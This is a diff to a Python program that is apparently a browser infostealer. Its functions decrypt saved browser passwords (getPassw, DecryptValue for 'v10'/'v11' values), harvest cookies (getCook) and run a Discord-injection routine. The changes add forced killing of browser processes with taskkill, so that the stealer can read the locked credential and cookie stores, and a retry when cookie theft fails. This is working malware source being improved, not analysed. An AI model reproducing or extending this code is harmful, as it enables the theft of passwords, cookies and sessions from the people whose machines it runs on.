@@ -1692,10 +1692,7 @@ Passw = []
 def getPassw(path, arg, process):
 
     try:
-        try:
-            close_process(process)
-        except:
-            pass
+
         def DecryptValue(Buffer, master_key=None):
             starts = Buffer.decode(encoding='utf8', errors='ignore')[:3]
             if starts == 'v10' or starts == 'v11':
@@ -2080,8 +2077,9 @@ def close_process(procc):
     if close_proc == True:
         try:
             subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
+            return True
         except:
-            pass
+            return False
         
     
 
@@ -2978,10 +2976,7 @@ def cokssite():
      
 def getCook(path, arg, process):
     try:
-        try:
-            close_process(process)
-        except:
-            pass
+
         global Cookies, CookiCount
         
         if not os.path.exists(path): 
@@ -3020,7 +3015,11 @@ def getCook(path, arg, process):
 
         writeforfile(Cookies, 'cook')
     except:
-        pass
+        try:
+            close = close_process(process[1]) 
+            getCook(path, arg, process)
+        except:
+            pass
     
 
             
@@ -3159,11 +3158,21 @@ def gatha():
         Second_Thread.append(Drives)
         
     for patt in browserPaths:
+        try: 
+            close_process(patt[1]) 
+        except:
+            pass
+         
+    for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3], patt[1]])
         pa.start()
         Second_Thread.append(pa)
         
     for patt in browserPaths: 
+        try: 
+            close_process(patt[1]) 
+        except:
+            pass
         getc = threading.Thread(target=getCook, args=[patt[0], patt[4], patt[1]])
         getc.start()
         Second_Thread.append(getc)
@@ -3251,12 +3260,12 @@ def gatha():
             ij.start()
             First_Thread.append(ij)
             
-            NoDiscord = False
+            DiscordStop = False
         except:
             pass
 
     
-    if NoDiscord == True:
+    if DiscordStop == True:
         try:
             no = threading.Thread(target=NoDiscord)
             no.start()
